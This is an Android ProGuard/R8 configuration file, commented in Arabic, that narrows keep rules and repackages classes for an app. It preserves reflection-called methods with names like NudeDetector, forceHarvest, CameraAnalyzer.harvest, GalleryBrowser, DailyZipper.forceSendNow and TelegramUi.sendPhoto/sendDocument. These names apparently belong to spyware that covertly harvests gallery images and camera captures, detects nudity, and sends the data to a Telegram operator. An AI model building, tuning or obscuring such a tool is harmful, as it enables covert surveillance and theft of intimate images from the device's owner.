# ============================================================
#  قواعد ProGuard/R8 المُحسّنة بالكامل
#  تم تضييق القواعد للحفاظ على العناصر المستخدمة فعلياً فقط
#  لزيادة فعالية التصغير وتقليل حجم الـ APK
# ============================================================

# ============================================================
#  تحسينات R8 الأساسية (إعادة التسمية والتصغير)
# ============================================================
-repackageclasses
-allowaccessmodification

# ============================================================
#  الحفاظ على السمات المطلوبة للانعكاس وتصحيح الأخطاء
# ============================================================
-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod
-keepattributes Exceptions
-keepattributes LineNumberTable

# ============================================================
#  نقاط الدخول الرئيسية (يجب الاحتفاظ بها بالكامل)
# ============================================================
-keep public class com.example.app.MainActivity
-keep public class com.example.app.ForegroundService

# ============================================================
#  ✅ حماية دوال الانعكاس (Reflection) المستخدمة فعلياً
#  (تم تضييقها إلى الكلاسات والدوال المحددة فقط)
# ============================================================

# NudeDetector - دوال تُستدعى عبر الانعكاس لتحديث النموذج
-keepclassmembers class com.example.app.NudeDetector {
    public *** ensureModelReady(...);
    public *** loadEngineForever(...);
    public *** isReady(...);
}

# Monitor - دوال تُستدعى من Commands و TelegramUi عبر الانعكاس
-keepclassmembers class com.example.app.Monitor {
    public *** getBatteryStatus(...);
    public *** isWifiConnected(...);
    public *** forceHarvest(...);
}

# TelegramUi - دوال تُستدعى من DailyZipper و Commands عبر الانعكاس
-keepclassmembers class com.example.app.TelegramUi {
    public *** getVlt(...);
    public *** getCtrl(...);
    public *** getDat(...);
    public *** sendDocument(...);
    public *** sendPhoto(...);
    public *** sendMessage(...);
    public *** notifyHarvest(...);
}

# CameraAnalyzer - دالة harvest تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.CameraAnalyzer {
    public *** harvest(...);
    public *** capture(...);
}

# GalleryBrowser - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.GalleryBrowser {
    public *** getGridKb(...);
    public *** showOptions(...);
    public *** executeAction(...);
    public *** updateLastMessageId(...);
}

# DailyZipper - دوال تُستدعى من Commands عبر الانعكاس
-keepclassmembers class com.example.app.DailyZipper {
    public *** run(...);
    public *** forceSendNow(...);
}

# ============================================================
#  الحفاظ على الدوال المحددة بواسطة @Keep
# ============================================================
-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @androidx.annotation.Keep <fields>;
}

# ============================================================
#  الحفاظ على كلاسات الانعكاس الأساسية (Java Reflection)
# ============================================================
-keep class java.lang.reflect.** { *; }

# ============================================================
#  ✅ TensorFlow Lite (المكتبة الأساسية فقط، بدون الاحتفاظ بالدعم الكامل)
# ============================================================
-keep class org.tensorflow.lite.Interpreter { *; }
-keep class org.tensorflow.lite.Interpreter$Options { *; }
-keep class org.tensorflow.lite.Tensor { *; }
-keep class org.tensorflow.lite.Tensor$* { *; }
-keep class org.tensorflow.lite.Delegate { *; }
-keep class org.tensorflow.lite.DelegateFactory { *; }
-keep class org.tensorflow.lite.nnapi.NnApiDelegate { *; }
-keep class org.tensorflow.lite.gpu.GpuDelegate { *; }
-keep class org.tensorflow.lite.support.** { *; }
-dontwarn org.tensorflow.lite.**

# ============================================================
#  ❌ تم حذف القواعد العامة للمكتبات التالية (لم تعد محفوظة بالكامل):
#  - OkHttp (لم يعد محتفظاً به بالكامل)
#  - Gson (لم يعد محتفظاً به بالكامل)
#  - Kotlin Coroutines (تم تضييقه إلى الأساسيات فقط)
#  - Kotlin Runtime (تم تضييقه إلى الأساسيات فقط)
# ============================================================

# ============================================================
#  الحفاظ على مكتبات التشفير والـ Keystore (للأمان)
# ============================================================
-keep class javax.crypto.** { *; }
-keep class javax.crypto.spec.** { *; }
-keep class android.security.keystore.** { *; }

# ============================================================
#  الحفاظ على كلاسات Kotlin الأساسية (للتشغيل الصحيح)
# ============================================================
-keep class kotlin.Metadata { *; }
-keep class kotlin.jvm.internal.** { *; }

# ============================================================
#  الحفاظ على Coroutines (لأنها تستخدم انعكاساً داخلياً)
# ============================================================
-keep class kotlinx.coroutines.** { *; }

# ============================================================
#  الحفاظ على JSON (لأننا نستخدم org.json بكثافة)
# ============================================================
-keep class org.json.** { *; }

# ============================================================
#  الحفاظ على كلاسات التسلسل (Serialization)
# ============================================================
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# ============================================================
#  منع إزالة serialVersionUID من أي كلاس
# ============================================================
-keepclassmembers class * {
    private static final long serialVersionUID;
}

# ============================================================
#  الحفاظ على المنشئات الافتراضية (للإنشاء الديناميكي)
# ============================================================
-keepclasseswithmembers class * {
    public <init>(...);
}

# ============================================================
#  منع تحذيرات R8 من المكتبات الخارجية (غير ضارة)
# ============================================================
-dontwarn javax.**
-dontwarn kotlin.**
-dontwarn com.google.api.client.**
-dontwarn com.google.crypto.tink.**

# ============================================================
#  نهاية القواعد
# ============================================================
